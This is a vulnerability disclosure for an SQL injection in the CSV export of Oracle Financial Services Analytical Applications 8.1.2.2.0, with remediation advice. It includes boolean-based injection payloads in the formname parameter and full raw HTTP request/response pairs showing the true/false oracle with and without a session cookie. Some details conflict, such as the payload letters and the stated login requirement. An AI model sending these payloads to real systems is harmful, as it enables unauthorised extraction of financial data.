# Oracle Financial Services Analytical Applications - Unauthenticated SQL Injection in export CSV

**Vendors:** Oracle ([https://www.oracle.com/](https://www.oracle.com/))
**Product:** Oracle Financial Services Analytical Applications ([https://www.oracle.com/financial-services/analytics/](https://www.oracle.com/financial-services/analytics/)) - Modules Asset Liability Management
**Version:** 8.1.2.2.0
**Discovered by:** Le Quoc Bao, Nguyen Quoc Viet, Vy Tien Dat - HPT Vietnam Corporation

## **Description:**
Oracle Financial Services Analytical Applications Version 8.1.2.2.0 is vulnerable to SQL Injection. An unauthenticated attacker can exploit this vulnerability to inject malicious SQL query to extract information from databases.
*   **Vulnerable parameter**: `formname, app_name`
*   **Function**: Asset Liability Management > Common Object Maintenance > Data Entry Forms and Queries > Data Entry > Export CSV/XLS
*   **URL**: http://**\[yourdomain\]**/**\[APIHOST\]**/csv
*   **Method**: POST
*   **Payload**:
\- True case `'||SUBSTR('H',1,1)||'`
\- False case `'||SUBSTR('S',1,1)||'`
*   **Conditional**: User Login
*   **Vulnerable / Tested Versions:**
The following version has been tested which was the most recent one when the vulnerabilities were discovered:
Oracle Financial Services Analytical Applications Version 8.1.2.2.0
## **Severity:**
7.0 / High - CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:L
## Remediation:
**\- Input Validation and Sanitization**: Ensure all user inputs, especially in embedding functions, are strictly validated and sanitized before placing them in database queries.
**\- Use Secure Libraries**: Implement SQL query libraries or frameworks that offer built-in parameterized queries or prepared statements.
## Proof of Exploitation:
1. Login to user have granted privileges to using **Asset Liability Management** and able to modify Data Entry
![](https://t3897127.p.clickup-attachments.com/t3897127/3c246bdd-b1fd-4b18-b206-9ec2e5a08cf1/image.png)
*   Asset Liability Management
![](https://t3897127.p.clickup-attachments.com/t3897127/3d49231b-3d18-4ffa-88e4-ac638a0b7f96/image.png)
*   Common Object Maintenance
![](https://t3897127.p.clickup-attachments.com/t3897127/4fe768da-f082-4d42-a0a2-8e60a17036f1/image.png)
*   Data Entry Forms and Queries
![](https://t3897127.p.clickup-attachments.com/t3897127/fe9a2aa6-8959-4ead-bdae-851df8280e2d/image.png)
*   Data Entry :
![](https://t3897127.p.clickup-attachments.com/t3897127/e0872155-7641-4c7b-b1d8-87286560257b/image.png)
*   Export CSV/XLS:
![](https://t3897127.p.clickup-attachments.com/t3897127/3047f024-b03c-4c84-8615-d3fa4f9600bf/image.png)
2\. By select one of the Rows in the list and then clicking Export to download CSV/XLS file from database, we using Burp Suite here to intercept the request.
*   HTTP Request send when export CSV/XLS:
![](https://t3897127.p.clickup-attachments.com/t3897127/94220e63-ee3c-4763-9e2a-22164dd072f1/image.png)
3\. Send request to Repeater Tab and send, this is normal HTTP Request of successful download **<redacted>**\_IMP\_TERM\_CF.xls file with `Content-Length: 10752`
![](https://t3897127.p.clickup-attachments.com/t3897127/410f669b-cf37-4cd4-8bac-17db042ba8b4/image.png)
4\. Inject payload `'||SUBSTR('H',1,1)||'` into parameter `formname` with original value is **IMP\_TERM\_CF** \=> When inject payload `formname=`**`IMP_HERM_CF`** => **False** condition => `Content-Length: 0` cannot download file because filename not exist in database.
![](https://t3897127.p.clickup-attachments.com/t3897127/b6b1b6a5-05ff-4019-b695-769d1d72274f/image.png)
*   Details of HTTP Request/Response FALSE condition:
HTTP REQUEST:

```plain
POST /<apihost>/csv HTTP/1.1
Host: <yourdomain>
Content-Length: 201
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://<yourdomain>
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://<yourdomain>/<apihost>/DeFi/DataEntry/DisplayPage.jsp?formIdentifier=183&A=VAED&dispMode=Normal&TreeType=0
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=GYdTQ3k45xnkCxkk1s5rGP48V7gdf5d36l3m2IQhmaG1qkkmKq4y!416272305
Connection: close

formname=IMP_'||SUBSTR('S',1,1)||'ERM_CF&app_name=<redacted>&sourcename=<redacted>&userID=ALMUSER&startRow=0&endRow=0&filter=null&sort=&queryType=0&locale=en_US&currUser=false&_CSRF=null&APIHOST=%2F<apihost> 
```

HTTP RESPONSE:

```plain
HTTP/1.1 200 OK
Connection: close
Date: Fri, 22 Nov 2024 10:32:04 GMT
Content-Length: 0
Content-Type: application/download
Content-Disposition: attachment;filename="<redacted>_IMP_'||SUBSTR('S',1,1)||'ERM_CF.xls"
X-ORACLE-DMS-ECID: 9d0bd64c-0525-4ada-aac1-0bd432705446-000042b1
X-ORACLE-DMS-RID: 0
X-XSS-Protection: 1;mode=block
X-Content-Type-Options: nosniff
X-UA-Compatible: IE=EmulateIE7


```

5\. Inject payload `'||SUBSTR('T',1,1)||'` to parameter `formname` \=> When inject payload `formname=`**`IMP_TERM_CF`** => **True** condition => `Content-Length: 10752` valid file name exist in database so file was sucessfully downloaded.
![](https://t3897127.p.clickup-attachments.com/t3897127/28ca2487-437c-4fc7-872d-002760ff5745/image.png)
*   Details of HTTP Request/Response TRUE condition:
HTTP REQUEST:

```plain
POST /<apihost>/csv HTTP/1.1
Host: <yourdomain>
Content-Length: 201
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://<yourdomain>
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://<yourdomain>/<apihost>/DeFi/DataEntry/DisplayPage.jsp?formIdentifier=183&A=VAED&dispMode=Normal&TreeType=0
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=GYdTQ3k45xnkCxkk1s5rGP48V7gdf5d36l3m2IQhmaG1qkkmKq4y!416272305
Connection: close

formname=IMP_'||SUBSTR('T',1,1)||'ERM_CF&app_name=<redacted>&sourcename=<redacted>&userID=ALMUSER&startRow=0&endRow=0&filter=null&sort=&queryType=0&locale=en_US&currUser=false&_CSRF=null&APIHOST=%2F<apihost>


```

HTTP RESPONSE:

```plain
HTTP/1.1 200 OK
Connection: close
Date: Fri, 22 Nov 2024 10:31:48 GMT
Content-Length: 10752
Content-Type: application/download
Content-Disposition: attachment;filename="<redacted>_IMP_'||SUBSTR('T',1,1)||'ERM_CF.xls"
X-ORACLE-DMS-ECID: 9d0bd64c-0525-4ada-aac1-0bd432705446-000042a1
X-ORACLE-DMS-RID: 0
X-XSS-Protection: 1;mode=block
X-Content-Type-Options: nosniff
X-UA-Compatible: IE=EmulateIE7

<File Content>
```

6\. We use **Show response in browser** of Burpsuite, copy and paste to browser to check was downloaded, the content of file when inject SQL with **True** condition is same as original filename
![](https://t3897127.p.clickup-attachments.com/t3897127/77fd87c4-199d-44e4-93c9-0ed2d75e265b/image.png)
7\. Content of file download when inject SQL payload
![](https://t3897127.p.clickup-attachments.com/t3897127/958c62cb-770a-46bd-a2d2-967e36a10b1d/image.png)
8\. Content of file downloaded without inject payload
![](https://t3897127.p.clickup-attachments.com/t3897127/aec160ef-7a5f-41cc-ad54-d3bcfe7efce4/image.png)
9\. This endpoint is unauthenticated, so this vulnerability can lead to **Unauthenticated SQL Injection**.
*   Inject payload with **False** condition without any **Cookie** or Token
![](https://t3897127.p.clickup-attachments.com/t3897127/d25ffcf6-b3fc-4fa3-aa63-b8e053a340a1/image.png)
*   Inject payload with **True** condition without **Cookie** or Token
![](https://t3897127.p.clickup-attachments.com/t3897127/60f20d1a-8d9a-41b7-a472-5eae677ed3ee/image.png)